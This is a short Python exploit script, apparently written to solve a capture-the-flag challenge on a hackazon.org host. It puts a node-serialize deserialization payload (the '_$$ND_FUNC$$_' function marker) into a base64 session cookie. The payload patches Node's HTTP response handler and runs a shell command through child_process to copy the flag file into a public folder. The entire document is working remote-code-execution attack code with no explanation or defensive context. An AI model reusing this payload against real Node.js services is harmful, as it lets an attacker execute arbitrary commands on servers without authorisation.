import requests
import re
import base64
import sys

url = 'https://de4dbe4c6c4e7cea32a4378e967fbe74.challenge.hackazon.org/'
#url = 'http://localhost:8088'

payload = ("require('http').ServerResponse.prototype.end = (function (end) {"
"return function () {"
"['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
"console.log('still inside');"
"const { exec } = require('child_process');"
"exec('cp flag public/flag');"
"}"
"})(require('http').ServerResponse.prototype.end)")

code = "_$$ND_FUNC$$_" + payload

string = '{"id":"1657891011729.0","username":"test","country":"test", "exec": "'+code+'"}'

cookie = {'session':base64.b64encode(string.encode()).decode()}

try:
    response = requests.get(url, cookies=cookie).text
    print(response)
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)
